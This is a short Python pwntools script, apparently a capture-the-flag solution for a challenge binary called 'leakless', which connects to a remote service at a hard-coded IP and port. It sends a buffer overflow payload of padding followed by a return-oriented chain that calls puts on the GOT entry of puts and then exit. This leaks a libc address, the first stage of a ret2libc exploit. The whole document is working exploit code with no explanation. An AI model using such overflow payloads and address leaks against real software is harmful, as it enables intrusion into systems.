from pwn import *

elf = ELF("./leakless")
#sock = process("./leakless")
sock = remote("51.68.189.144", 31007)

addr_puts = elf.plt['puts']
addr_exit = elf.plt['exit']
got_puts = elf.got['puts']
print(hex(addr_puts))

payload = "A" * 0x4c
payload += p32(addr_puts)
payload += p32(addr_exit)
payload += p32(got_puts)

sock.sendline(payload)
addr = sock.recv(4)
addr += '\x00' * (4 - len(addr))
print(hex(u32(addr)))
